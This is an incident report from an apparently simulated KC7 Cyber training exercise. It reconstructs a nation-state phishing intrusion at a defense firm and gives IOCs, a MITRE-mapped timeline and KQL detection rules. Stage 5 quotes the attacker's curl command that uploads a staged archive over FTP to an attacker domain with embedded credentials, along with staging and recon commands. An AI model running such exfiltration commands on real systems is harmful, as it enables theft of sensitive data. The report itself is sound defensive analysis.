
# Incident report — TitanShield intrusion
**Case ID:** TS-2024-001
**Platform:** KC7 Cyber — Titan Shield (Microsoft Defender XDR track)
**Analyst:** Moamed Khaled Mohamed Zein.
**Date completed:** 25/2/2026
**Severity:** Critical
**Status:** Closed — Attributed

---

## Executive summary

TitanShield experienced a targeted, multi-stage intrusion conducted by two distinct nation-state threat actors. The attack chain began with LinkedIn reconnaissance 12 days before the first malicious payload executed, progressed through precision-targeted phishing against Defense Engineers and Network Engineers, and culminated in the confirmed exfiltration of classified Project Omega files to attacker-controlled FTP infrastructure.

Two threat actors were attributed: **Moonstone Sleet**, responsible for a trojanized video game campaign targeting defense staff, and **Crimson Sandstorm (Curium)**, responsible for a social engineering phishing campaign that spread a recon tool to 15 hosts across the organization.

---

## Attack timeline

| Timestamp | Event |
|---|---|
| 2024-07-05T00:00:00Z | First inbound recon request from actor IPs (208.199.30.154, 202.241.233.180) against company web presence |
| 2024-07-05 – 2024-07-16 | Continued LinkedIn profiling of TitanShield employees — 47 inbound requests total |
| 2024-07-17T10:47:43Z | `New_Diet_Plan_For_My_Love.xlsx` opened on IL5M-DESKTOP (chtaylor) — delivered via phishing email from marcella_flores@gmail.com |
| 2024-07-17T10:47:43Z | `C:\temp\macro.xlsm` executed — macro drops recon tooling |
| 2024-07-17 onwards | 39 recon commands logged to `%temp%\Logs.txt` on Taylor's machine |
| 2024-07-17 – 2024-07-20 | Same recon command pattern spreads to 15 hosts, 663 total executions |
| 2024-07-20T03:58:19Z | EDR alert triggered on IL5M-DESKTOP for `whoami` execution |
| Unknown | Project Omega files copied from `\\company_share\confidential\defense\project_omega\*` to `C:\StagingArea\` |
| Unknown | StagingArea contents compressed to `C:\ReadyToGo\TopSecret.zip` |
| Unknown | `curl -T TopSecret.zip ftp://matrixane.com/upload/` — exfiltration to C2 |
| 2024-08-03T07:09:23Z | David Jackson's machine searched for "EDR alerts" — actor checking detection status |
| Concurrent | Moonstone Sleet DeTankWar campaign: 6 phishing emails to Defense Engineers, DLLs deployed on multiple hosts |

---

## Stage 1 — Reconnaissance

**Threat actor:** Crimson Sandstorm (Curium)
**Technique:** Pre-attack external reconnaissance (MITRE T1590, T1591)

Two IPs — `208.199.30.154` and `202.241.233.180` — were identified in `InboundNetworkEvents` making 47 requests to TitanShield infrastructure. These IPs were resolved from attacker-controlled domains via Passive DNS, linking them to Crimson Sandstorm.

Requests included LinkedIn profile lookups for TitanShield employees. This allowed the actor to identify names, roles, and internal relationships before crafting the phishing lures — explaining why the targeting was precise enough to deliver role-specific content (a "diet plan" to a Network Engineer, fake job-relevant game to Defense Engineers).

**KQL used:** `InboundNetworkEvents | where src_ip in ("208.199.30.154", "202.241.233.180")`

---

## Stage 2 — Initial access (phishing)

**Threat actor:** Crimson Sandstorm (Curium)
**Technique:** Spearphishing link (MITRE T1566.002)

A phishing email from `marcella_flores@gmail.com` with subject line `[EXTERNAL] RE: Relax with these yoga poses, baby!` was sent to chtaylor (Network Engineer, IL5M-DESKTOP). The email contained a link to `https://healthylifestyle.com/share/New_Diet_Plan_For_My_Love.xlsx`.

The subject line used a personal, romantic tone — a social engineering technique designed to bypass the victim's professional suspicion filters. The download was confirmed via `OutboundNetworkEvents` and the file creation was confirmed in `FileCreationEvents` with `Edge.exe` as the creating process (downloaded via browser).

The same sender account sent 13 total emails and used 3 distinct domains — all of which were identified as Crimson Sandstorm infrastructure via Defender XDR Intel Explorer.

**Parallel vector:** Six employees received phishing emails linking to `detankwar.com`, a Moonstone Sleet-operated site distributing a fake tank game (`DeTankWar.zip`) to Defense Engineers specifically.

---

## Stage 3 — Execution

**Techniques:** Malicious macro (MITRE T1204.002), DLL side-loading (MITRE T1574.002)

On IL5M-DESKTOP, the victim opened the xlsx file, which triggered the execution of `C:\temp\macro.xlsm`. This macro was the execution bridge — it spawned the first recon command at `2024-07-17T10:47:43Z`.

In the Moonstone Sleet campaign, the DeTankWar game installed two trojanized DLLs — `NVUnityPlugin.dll` and `Unityplayer.dll` — on victim machines. Both DLLs were confirmed malicious via Defender XDR Threat Intelligence (hash score: high confidence, attributed to Moonstone Sleet).

---

## Stage 4 — Discovery

**Technique:** System information discovery (MITRE T1082, T1518, T1016)

Following macro execution, a recon tool ran 39 commands on Taylor's machine, each appending output to `%temp%\Logs.txt`. Commands included:

- `whoami` — current user context
- `wmic product get name,version` — installed software enumeration
- `ping yandex.com` — connectivity check / potential C2 geo-verification
- Various system and network enumeration commands

This pattern was not isolated. The same command signature (`echo`, `>>`, `logs.txt`) appeared across **15 distinct hosts** with **663 total process events**. All affected machines belonged to Network Engineers — confirmed with the Network Engineering manager to be unauthorized. No legitimate tool in the organization matches this behavior.

---

## Stage 5 — Collection and exfiltration

**Technique:** Data staged locally (MITRE T1074.001), exfiltration over alternative protocol (MITRE T1048.003)

The attacker identified and collected files from a sensitive network share:

```
\\company_share\confidential\defense\project_omega\*
```

These were staged to `C:\StagingArea\`, then compressed:

```powershell
Compress-Archive -Path C:\StagingArea\* -DestinationPath C:\ReadyToGo\TopSecret.zip
```

The archive was then exfiltrated via FTP using hardcoded credentials:

```
curl -T C:\ReadyToGo\TopSecret.zip ftp://matrixane.com/upload/ --user exfil:tankpass
```

The exfiltration was confirmed on David Jackson's machine (`10.10.0.8`). Logs also show the stolen data was sent via email to `exfilbucket93@gmail.com`. Post-exfiltration, the actor searched for "EDR alerts" from Jackson's machine on `2024-08-03T07:09:23Z`, indicating they were monitoring for detection.

---

## Threat actor attribution

### Moonstone Sleet
- **Campaign:** Fake tank game (DeTankWar) as phishing lure
- **Targeting:** Defense Engineers — precision role-based targeting
- **IOCs:**
- Domain: `detankwar.com`
- File: `DeTankWar.zip` — SHA256: `56554117d96d12bd3504ebef2a8f28e790dd1fe583c33ad58ccbf614313ead8c` — TI score: 100
- DLL: `NVUnityPlugin.dll` / `Unityplayer.dll` — SHA256: `09d152aa2b6261e3b0a1d1c19fa8032f215932186829cfcca954cc5e84a6cc38`
- **Attribution method:** Defender XDR Threat Intelligence file hash lookup

### Crimson Sandstorm (Curium)
- **Campaign:** Social engineering phishing + recon tool deployment
- **Targeting:** Network Engineers, company-wide via 15-host spread
- **IOCs:**
- Sender: `marcella_flores@gmail.com`
- IPs: `208.199.30.154`, `202.241.233.180`
- C2 domains: `mingeloem.com`, `matrixane.com`
- Exfil destination: `exfilbucket93@gmail.com`
- **Attribution method:** Defender XDR Intel Explorer (domain search) + Passive DNS pivot

---

## Indicators of compromise

| Type | Value | Actor |
|---|---|---|
| Domain | detankwar.com | Moonstone Sleet |
| Domain | mingeloem.com | Crimson Sandstorm |
| Domain | matrixane.com | Crimson Sandstorm |
| File hash (SHA256) | 56554117d96d12bd3504ebef2a8f28e790dd1fe583c33ad58ccbf614313ead8c | Moonstone Sleet |
| File hash (SHA256) | 09d152aa2b6261e3b0a1d1c19fa8032f215932186829cfcca954cc5e84a6cc38 | Moonstone Sleet |
| File hash (SHA256) | 6aeef036eb85a470dbd6d039250172a510a8627b873e8b3b79fae5a7dd767e73 | Crimson Sandstorm |
| IP | 208.199.30.154 | Crimson Sandstorm |
| IP | 202.241.233.180 | Crimson Sandstorm |
| Email | marcella_flores@gmail.com | Crimson Sandstorm |
| Email | exfilbucket93@gmail.com | Crimson Sandstorm (exfil destination) |
| File path | C:\StagingArea\ | Crimson Sandstorm |
| File path | C:\ReadyToGo\TopSecret.zip | Crimson Sandstorm |
| Registry/process | %temp%\Logs.txt | Crimson Sandstorm |

---

## Recommended detections (post-incident)

These are detection rules that should have been in place, or that this investigation informs going forward.

**1. FTP exfiltration via curl**
```kql
DeviceProcessEvents
| where ProcessCommandLine has "curl"
| where ProcessCommandLine has_any ("ftp://", "-T ", "--user")
| where ProcessCommandLine has_any ("upload", "put")
```
Severity: High. Any curl-based FTP upload with embedded credentials is near-certain exfiltration.

**2. Recon tool logging pattern**
```kql
DeviceProcessEvents
| where ProcessCommandLine has_all ("echo", ">>", ".txt")
| where ProcessCommandLine has_any ("whoami", "wmic", "ipconfig", "systeminfo")
| summarize count() by DeviceName
| where count_ > 5
```
Severity: Medium. Aggregated threshold avoids single-event noise.

**3. Office spawning shell processes**
```kql
DeviceProcessEvents
| where InitiatingProcessFileName in~ ("winword.exe", "excel.exe", "powerpnt.exe")
| where FileName in~ ("cmd.exe", "powershell.exe", "wscript.exe", "mshta.exe")
```
Severity: High. No legitimate Office workflow spawns a shell.

---

## Lessons learned

1. **The first alert on Taylor should have been escalated faster.** The `whoami` EDR alert was treated as low-fidelity. One KQL pivot revealed 39 recon commands and a macro execution just minutes before — context that changes the severity from Low to Critical immediately.

2. **15 hosts were compromised before the recon pattern was noticed.** A proactive hunting query for `logs.txt` dump behavior — run weekly — would have caught this at host 1 or 2, not host 15.

3. **The recon phase (July 5) predated the attack by 12 days.** If inbound traffic from those IPs had triggered an alert on first contact, the phishing campaign might have been intercepted before delivery.

---

*Investigation conducted in the KC7 Cyber simulated environment — Titan Shield module (Microsoft-sponsored). No real systems were accessed.*
